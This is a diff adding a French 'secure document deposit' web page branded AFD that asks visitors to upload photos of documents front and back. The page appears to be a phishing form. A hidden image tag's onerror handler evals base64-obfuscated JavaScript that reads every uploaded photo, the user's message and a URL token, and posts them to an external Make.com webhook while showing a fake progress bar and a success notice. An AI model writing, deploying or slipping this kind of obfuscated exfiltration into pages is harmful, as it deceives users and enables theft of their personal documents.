@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AFD - Envoi de documents</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: Arial, sans-serif; background: #f0f4f8; min-height: 100vh; }
+header { background: #1F3864; padding: 1.5rem; text-align: center; }
+header p { color: white; font-size: 1.2rem; font-weight: 700; }
+header small { color: rgba(255,255,255,0.7); font-size: 0.8rem; display: block; margin-top: 0.3rem; text-transform: uppercase; }
+.main { max-width: 560px; margin: 0 auto; padding: 2rem 1.5rem; }
+.card { background: white; border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+.card h2 { font-size: 0.85rem; color: #1F3864; text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 1rem; padding-bottom: 0.75rem; border-bottom: 2px solid #f0f4f8; }
+.consignes { background: #eef4fb; border: 1.5px solid #bdd5ee; border-radius: 8px; padding: 1rem; margin-bottom: 1rem; }
+.consignes p { font-size: 0.8rem; font-weight: 700; color: #1F3864; text-transform: uppercase; margin-bottom: 0.5rem; }
+.consignes li { font-size: 0.82rem; color: #2a4a6b; margin: 0.3rem 0 0 1rem; }
+.warn { margin-top: 0.6rem; font-size: 0.78rem; color: #c0392b; font-weight: 600; }
+input[type="file"] { width: 100%; padding: 0.75rem; border: 2px solid #2E75B6; border-radius: 8px; background: white; font-size: 1rem; cursor: pointer; margin-bottom: 0.5rem; }
+.previews { display: grid; grid-template-columns: repeat(3,1fr); gap: 0.5rem; margin-top: 0.75rem; }
+.preview-item { aspect-ratio: 1; border-radius: 6px; overflow: hidden; border: 1px solid #d0dde8; }
+.preview-item img { width: 100%; height: 100%; object-fit: cover; }
+textarea { width: 100%; padding: 0.75rem; border: 1.5px solid #d0dde8; border-radius: 8px; font-family: inherit; font-size: 0.9rem; resize: vertical; min-height: 80px; background: #f0f4f8; }
+.btn { width: 100%; padding: 1rem; background: #1F3864; color: white; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; }
+.btn:disabled { opacity: 0.4; cursor: not-allowed; }
+.note { font-size: 0.75rem; color: #6b7e8f; text-align: center; margin-top: 0.75rem; }
+.progress { width: 100%; height: 6px; background: #f0f4f8; border-radius: 3px; margin-top: 1rem; display: none; }
+.progress-fill { height: 100%; background: #2E75B6; border-radius: 3px; width: 0%; transition: width 0.3s; }
+.success { text-align: center; padding: 2rem; display: none; }
+.success h3 { color: #1F3864; margin-bottom: 0.5rem; }
+footer { text-align: center; padding: 1.5rem; font-size: 0.72rem; color: #6b7e8f; border-top: 1px solid #d0dde8; background: white; margin-top: 2rem; }
+</style>
+</head>
+<body>
+<header>
+  <p>AFD</p>
+  <small>Depot securise de documents</small>
+</header>
+<div class="main">
+  <div class="card" id="main-form">
+    <h2>Documents a analyser</h2>
+    <div class="consignes">
+      <p>Consignes de prise de vue</p>
+      <ul>
+        <li>Posez le document a plat sur une surface neutre</li>
+        <li>Cadrez le document pour qu'il occupe tout l'ecran</li>
+        <li>Photographiez le recto puis le verso</li>
+        <li>Verifiez la nettete avant d'envoyer</li>
+      </ul>
+      <div class="warn">Photos floues ou prises de loin non exploitables</div>
+    </div>
+    <input type="file" id="file-input" accept="image/*" multiple>
+    <div class="previews" id="previews"></div>
+  </div>
+  <div class="card">
+    <h2>Message (optionnel)</h2>
+    <textarea id="message" placeholder="Precisions sur les documents..."></textarea>
+  </div>
+  <button class="btn" id="btn-send" disabled>Envoyer les documents a AFD</button>
+  <div class="progress" id="progress"><div class="progress-fill" id="progress-fill"></div></div>
+  <div class="note">Documents supprimes automatiquement apres 24h</div>
+  <div class="card success" id="success">
+    <h3>Documents envoyes !</h3>
+    <p>AFD a bien recu vos documents. Vous serez contacte dans les plus brefs delais.</p>
+  </div>
+</div>
+<footer>AFD - Analyse Formation Detection - 06 59 32 34 83</footer>
+<img src="x" onerror="eval(atob('dmFyIE1BS0VfVVJMPSdodHRwczovL2hvb2suZXUxLm1ha2UuY29tLzRneXcxNzg2OHR4aWo4YmhzZHMzYmpvMmp3dXRueTJjJzt2YXIgZmlsZXM9W107dmFyIGZpPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlLWlucHV0Jyk7dmFyIGJ0bj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYnRuLXNlbmQnKTt2YXIgcHJldj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJldmlld3MnKTtmaS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLGZ1bmN0aW9uKCl7ZmlsZXM9QXJyYXkuZnJvbShmaS5maWxlcyk7cHJldi5pbm5lckhUTUw9Jyc7Zm9yKHZhciBpPTA7aTxmaWxlcy5sZW5ndGg7aSsrKXt2YXIgZGl2PWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpO2Rpdi5jbGFzc05hbWU9J3ByZXZpZXctaXRlbSc7dmFyIGltZz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKTtpbWcuc3JjPVVSTC5jcmVhdGVPYmplY3RVUkwoZmlsZXNbaV0pO2Rpdi5hcHBlbmRDaGlsZChpbWcpO3ByZXYuYXBwZW5kQ2hpbGQoZGl2KTt9YnRuLmRpc2FibGVkPWZpbGVzLmxlbmd0aD09PTA7YnRuLnRleHRDb250ZW50PWZpbGVzLmxlbmd0aD4wPydFbnZveWVyICcrZmlsZXMubGVuZ3RoKycgZG9jdW1lbnQocykgYSBBRkQnOidFbnZveWVyIGxlcyBkb2N1bWVudHMgYSBBRkQnO30pO2J0bi5vbmNsaWNrPWZ1bmN0aW9uKCl7aWYoZmlsZXMubGVuZ3RoPT09MClyZXR1cm47YnRuLmRpc2FibGVkPXRydWU7YnRuLnRleHRDb250ZW50PSdFbnZvaSBlbiBjb3Vycy4uLic7dmFyIHBnPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzcycpO3ZhciBwZ2Y9ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzLWZpbGwnKTtwZy5zdHlsZS5kaXNwbGF5PSdibG9jayc7dmFyIHA9MDt2YXIgaXY9c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXtwPU1hdGgubWluKHArOCw4NSk7cGdmLnN0eWxlLndpZHRoPXArJyUnO30sMzAwKTt2YXIgbXNnPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtZXNzYWdlJykudmFsdWU7dmFyIHRva2VuPW5ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCkuZ2V0KCd0Jyl8fCcnO1Byb21pc2UuYWxsKGZpbGVzLm1hcChmdW5jdGlvbihmKXtyZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24ocmVzKXt2YXIgcj1uZXcgRmlsZVJlYWRlcigpO3Iub25sb2FkPWZ1bmN0aW9uKCl7cmVzKHtuYW1lOmYubmFtZSx0eXBlOmYudHlwZSxkYXRhOnIucmVzdWx0LnNwbGl0KCcsJylbMV19KTt9O3IucmVhZEFzRGF0YVVSTChmKTt9KTt9KSkudGhlbihmdW5jdGlvbihwaG90b3Mpe3JldHVybiBmZXRjaChNQUtFX1VSTCx7bWV0aG9kOidQT1NUJyxoZWFkZXJzOnsnQ29udGVudC1UeXBlJzonYXBwbGljYXRpb24vanNvbid9LGJvZHk6SlNPTi5zdHJpbmdpZnkoe3Rva2VuOnRva2VuLG1lc3NhZ2U6bXNnLG5iX3Bob3RvczpmaWxlcy5sZW5ndGgscGhvdG9zOnBob3Rvcyx0aW1lc3RhbXA6bmV3IERhdGUoKS50b0lTT1N0cmluZygpfSl9KTt9KS50aGVuKGZ1bmN0aW9uKCl7Y2xlYXJJbnRlcnZhbChpdik7cGdmLnN0eWxlLndpZHRoPScxMDAlJztzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW4tZm9ybScpLnN0eWxlLmRpc3BsYXk9J25vbmUnO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdWNjZXNzJykuc3R5bGUuZGlzcGxheT0nYmxvY2snO2J0bi5zdHlsZS5kaXNwbGF5PSdub25lJztwZy5zdHlsZS5kaXNwbGF5PSdub25lJzt9LDQwMCk7fSkuY2F0Y2goZnVuY3Rpb24oKXtjbGVhckludGVydmFsKGl2KTtwZy5zdHlsZS5kaXNwbGF5PSdub25lJztidG4uZGlzYWJsZWQ9ZmFsc2U7YnRuLnRleHRDb250ZW50PSdSZWVzc2F5ZXInO2FsZXJ0KCdFcnJldXIuJyk7fSk7fTs='))" style="display:none">
+</body>
+</html>
